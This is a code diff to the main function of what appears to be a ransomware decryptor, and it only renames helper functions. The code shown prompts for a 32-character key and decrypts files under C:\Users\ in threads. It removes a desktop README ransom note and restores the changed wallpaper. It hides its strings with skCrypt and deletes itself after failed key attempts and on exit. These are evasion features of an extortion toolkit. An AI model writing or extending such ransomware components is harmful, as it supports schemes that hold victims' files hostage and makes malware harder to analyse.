@@ -35,7 +35,7 @@ int main(int argc, char* argv[])
 
         if (MAX_RETRIES && retries > NUMBER_RETRIES) {
             if (SELFKILL_RETRIES && !DEBUG && argc > 0)
-                deleteMe((string)argv[0]);
+                DeleteMe((string)argv[0]);
             break;
         }
         
@@ -43,7 +43,7 @@ int main(int argc, char* argv[])
         cout << skCrypt("Type decryption key: ");
         cin >> key;
 
-        if (key.size() == 32 && checkKey(key)) {
+        if (key.size() == 32 && CheckKey(key)) {
             remove((CHECKSUM_FILE + FILE_EXTENSION).c_str());
             break;
         }
@@ -57,29 +57,29 @@ int main(int argc, char* argv[])
         dir = (string)skCrypt("C:\\Users\\");
     else {
         dir = DEBUG_FOLDER;
-        if (argc < 2 && fileExists(DEBUG_FOLDER))
+        if (argc < 2 && FileExists(DEBUG_FOLDER))
             dir = DEBUG_FOLDER;
         else
             dir = argv[1];
     }
 
-    vector<vector<string>> filesSplitted = vectorSplitter(getFiles(dir), MAX_THREADS);
+    vector<vector<string>> filesSplitted = VectorSplitter(GetFiles(dir), MAX_THREADS);
 
 
     // DECRYPT FILES IN THREADS
     thread threads[MAX_THREADS];
     for (int i = 0; i < filesSplitted.size(); i++)
-        threads[i] = thread(decryptFiles, filesSplitted[i], key);
+        threads[i] = thread(DecryptFiles, filesSplitted[i], key);
     for (int i = 0; i < filesSplitted.size(); i++)
         threads[i].join();
 
 
     if (DROP_README)
-        if (remove(((string)skCrypt("C:\\Users\\") + getUserName() + (string)skCrypt("\\Desktop\\README.txt")).c_str()) != 0)
-            DeleteFileA(((string)skCrypt("C:\\Users\\") + getUserName() + (string)skCrypt("\\Desktop\\README.txt")).c_str());
+        if (remove(((string)skCrypt("C:\\Users\\") + GetUsername() + (string)skCrypt("\\Desktop\\README.txt")).c_str()) != 0)
+            DeleteFileA(((string)skCrypt("C:\\Users\\") + GetUsername() + (string)skCrypt("\\Desktop\\README.txt")).c_str());
 
     if (CHANGE_WALLPAPER) {
-        restoreWallpaper();
+        RestoreWallpaper();
         if (remove((NEWWALLPAPER).c_str()) != 0)
             DeleteFileA((NEWWALLPAPER).c_str());
     }
@@ -88,6 +88,6 @@ int main(int argc, char* argv[])
     system(skCrypt("pause"));
 
     if (!DEBUG && argc > 0)
-        deleteMe((string)argv[0]);
+        DeleteMe((string)argv[0]);
     return 0;
 }
